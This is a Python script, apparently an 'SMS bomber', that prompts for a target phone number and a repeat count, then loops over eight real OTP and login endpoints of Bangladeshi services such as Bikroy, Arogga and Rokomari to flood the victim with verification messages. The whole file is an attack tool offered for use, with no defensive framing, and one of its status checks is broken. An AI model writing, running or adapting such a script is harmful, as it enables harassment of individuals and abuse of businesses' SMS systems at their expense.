import requests as rq
Number = input("Enter Your Target Number : ")
amount = int(input("ENTER YOUR LIMIT : "))
url1 = 'https://api.osudpotro.com/api/v1/users/send_otp'
data1 = {"mobile": f"+88-{Number}", "deviceToken": "web", "language": "en", "os": "web"}
url2 = 'https://api.osudkini.com/api/otp/generate-otp'
data2 = {"phoneNo": f"{Number}"}
url3= 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+Number
url4 = "https://developer.medha.info/api/send-otp"
data4 = {"phone": f"{Number}","is_register": "1"}
url5 = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=120.0.0.0&os=Android&osv=10&refPartner="
data5 = {
"mobile":f"88{Number}"
}
url6 = "https://meenabazardev.com/api/front/send/otp"
data6 = {"CellPhone":f"{Number}","type":"login"}
url7 = f"https://www.rokomari.com/otp/send?emailOrPhone=88{Number}&countryCode=BD"
url8 = "https://api.apex4u.com/api/auth/login"
data8 = {"phoneNumber":f"{Number}"}
for i in range(amount):
    
    res2 = rq.get(url3)
    if res2.json()['otp_length']==6:
        print(f" {i+1} SMS SENT FROM BIKROY.COM")
    else:
        print("NETWORK ERROR")
    res1 = rq.post(url2, json=data2)
    if res1.json()['success']==True:
        print(f" {i+1} SMS SENT FROM OSUDKINI")
    else:
        print("NETWORK ERROR")
    res3 = rq.post(url1, json=data1)
    if res3.json()['status']==False:
        print(f" {i+1} SMS SENT FROM OSUDPOTRO")
    else:
        print("NETWORK ERROR")
    res4 = rq.post(url4,json=data4)
    if res4.json()["success"]==True:
        print(f" {i+1} SMS SENT FROM MEDHA")
    else:
        print("NETWORK ERROR")
    res5 = rq.post(url5,data=data5)
    if res5.json()["status"]=="success":
        print(f" {i+1} SMS SENT FROM AROGGA")
    else:
        print("NETWORK ERROR")
    res6 = rq.post(url6,json=data6)
    if res6.status_code == 200 or 201:
        print(f" {i+1} SMS SENT FROM MEENA BAZAR")
    else:
        print("NETWORK ERROR")
    res7 = rq.post(url7)
    if res7.status_code == 200:
        print(f" {i+1} SMS SENT FROM ROKOMARI")
    else:
        print("NETWORK ERROR")
    res8 = rq.post(url8)
    if res8.status_code == 200:
        print(f" {i+1} SMS SENT FROM APEX")
    else:
        print("NETWORK ERROR")

